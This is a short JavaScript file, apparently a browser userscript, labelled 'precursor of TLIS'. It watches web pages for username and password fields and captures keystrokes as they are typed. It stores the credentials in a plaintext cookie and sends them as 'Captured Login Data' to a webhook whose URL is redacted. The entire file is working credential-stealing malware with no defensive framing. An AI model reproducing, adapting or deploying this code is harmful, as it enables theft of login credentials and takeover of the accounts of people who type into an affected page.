// precursor of TLIS. 
(function() {
    'use strict';

    const webhookURL = 'XXXX'; 
    const COOKIE_NAME = 'inputData';
    const DEBOUNCE_DELAY = 300;

    let lastUsername = '';
    let lastPassword = '';
    let debounceTimer;

    function getRandomColor() {
        return '#' + Math.floor(Math.random() * 16777215).toString(16);
    }

    function getRandomString(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    function sendToWebhook(username, password) {
        const payload = {
            content: null,
            embeds: [
                {
                    title: 'Captured Login Data',
                    description: `**Username:** ${username}\n**Password:** ${password}`,
                    color: parseInt(getRandomColor().replace('#', ''), 16),
                }
            ]
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).catch(error => {
            console.error('Error sending data to webhook:', error);
        });
    }

    function setCookie(name, value, days) {
        const d = new Date();
        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + d.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    function handleInputChange(usernameInput, passwordInput) {
        if (usernameInput && passwordInput) {
            const username = usernameInput.value;
            const password = passwordInput.value;

            clearTimeout(debounceTimer);

            debounceTimer = setTimeout(() => {
                if (username !== lastUsername || password !== lastPassword) {
                    lastUsername = username;
                    lastPassword = password;

                    const cookieValue = `username=${username}&password=${password}`;
                    setCookie(COOKIE_NAME, cookieValue, 1);

                    sendToWebhook(username, password);
                }
            }, DEBOUNCE_DELAY);
        }
    }

    function setupEventListeners() {
        const usernameInput = document.querySelector('input[name="username"]');
        const passwordInput = document.querySelector('input[name="password"][type="password"]');

        if (usernameInput && passwordInput) {
            usernameInput.addEventListener('input', () => handleInputChange(usernameInput, passwordInput));
            passwordInput.addEventListener('input', () => handleInputChange(usernameInput, passwordInput));
        }
    }

    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.addedNodes.length) {
                setupEventListeners();
            }
        });
    });

    window.addEventListener('load', () => {
        observer.observe(document.body, { childList: true, subtree: true });
        setupEventListeners();
    });

})();
